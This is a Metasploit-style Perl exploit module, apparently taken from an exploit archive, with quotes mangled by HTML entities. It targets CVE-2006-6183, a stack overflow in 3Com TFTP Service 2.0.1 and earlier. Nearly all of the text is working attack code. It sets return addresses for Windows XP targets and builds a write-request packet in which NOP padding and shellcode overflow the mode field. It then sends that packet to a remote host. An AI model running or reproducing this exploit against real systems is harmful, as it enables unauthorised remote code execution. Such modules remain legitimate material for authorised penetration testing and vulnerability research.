3Com TFTP Service <= 2.0.1 Remote Buffer Overflow Exploit (meta)
================================================================

package Msf::Exploit::3com_tftp_long_mode;

use strict;
use base "Msf::Exploit";
use Pex::Text;
use IO::Socket;

my $advanced = 
  {
  };

my $info =
  {
	&#039;Name&#039;           => &#039;TFTP Server 3CTftpSvc Buffer Overflow Vulnerability&#039;,
	&#039;Version&#039;        => &#039;$ 1.0 $&#039;,
	&#039;Authors&#039;        => [&#039;Enseirb <vincenty [at] enseirb.fr>&#039;, ],
	&#039;Description&#039;    =>
	  Pex::Text::Freeform(qq{
		This vulnerability is caused due to a boundary error during the processing of TFTP Read/Write request packet types. This can be exploited to cause a stack-based buffer overflow by sending a specially crafted packet with an overly long mode field (more than 460 bytes).
                            }),

	&#039;Arch&#039;           => [ &#039;x86&#039; ],
	&#039;OS&#039;             => [ &#039;win32&#039; ],
	&#039;Priv&#039;           => 0,

	&#039;AutoOpts&#039;       => { &#039;EXITFUNC&#039; => &#039;seh&#039; },
	&#039;UserOpts&#039;       =>
	  {
		&#039;RHOST&#039;  => [ 1, &#039;ADDR&#039;, &#039;The TFTP target adress&#039;, "127.0.0.1" ],
		&#039;RPORT&#039;  => [ 0, &#039;PORT&#039;, &#039;The TFTP target port&#039;, 69 ],
	  },	

	&#039;Payload&#039;        =>
	  {
		&#039;Space&#039;    => 344,
		&#039;BadChars&#039; => "\x00",
	  },

	&#039;Refs&#039;           =>
	  [
		[&#039;URL&#039;, &#039;http://www.securityfocus.com/bid/21301&#039;],
		[&#039;CVE&#039;, &#039;2006-6183&#039;],
		[&#039;URL&#039;, &#039;http://secunia.com/advisories/23113&#039;],
		[&#039;URL&#039;, &#039;http://www.securityfocus.com/archive/1/452754&#039;],		
	  ],

	&#039;DefaultTarget&#039;  => 0,
	&#039;Targets&#039;        =>
	  [
		[ &#039;0 - Windows XP SP2 ENG&#039;, 0x77d4e23b ], #or 0x77bc2063
	        [ &#039;1 - Windows XP SP1 FR&#039;, 0x77d8117b ],
	        [ &#039;2 - Windows XP SP2 FR&#039;, 0x77d8d9af ],
	  ],

	&#039;Keys&#039;           => [ &#039;3com&#039; ],

	&#039;DisclosureDate&#039; => &#039;Nov 27 2006&#039;,
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit 
{
    my $self = shift;
    my $target_idx  = $self->GetVar(&#039;TARGET&#039;);
    my $target_host = $self->GetVar(&#039;RHOST&#039;);
    my $target_port = $self->GetVar(&#039;RPORT&#039;);
    my $shellcode = $self->GetVar(&#039;EncodedPayload&#039;)->Payload;
    my $target = $self->Targets->[$target_idx];

    my $buff = "\x00\x02"; # for a WRQ (WriteReQuest) (or "\x00\x01" for a RRQ)
    $buff .= "filename_string";
    $buff .= "\x00";
    $buff .= $self->MakeNops(129) . $shellcode; 
    $buff .= pack(&#039;V&#039;,$target->[1]);
    $buff .= "\x00";

    $self->PrintLine(&#039;[+] Try to connect... &#039; . $target_host . &#039;:&#039; . $target_port);

    my $s = Msf::Socket::Udp->new
	(
	 &#039;PeerAddr&#039;  => $target_host,
	 &#039;PeerPort&#039;  => $target_port,	 
	);
    
    if ($s->IsError) {
	$self->PrintLine(&#039;[-] Error creating socket: &#039; . $s->GetError);
	return;
    }
 
    $self->PrintLine(&#039;[+] Connected!&#039;);
    $self->PrintLine(&#039;[+] Sending exploit...&#039;);

    $s->Send($buff);
    $self->PrintLine(&#039;[+] Exploit sent!&#039;);
    $s->Close();

    return;
}

1;


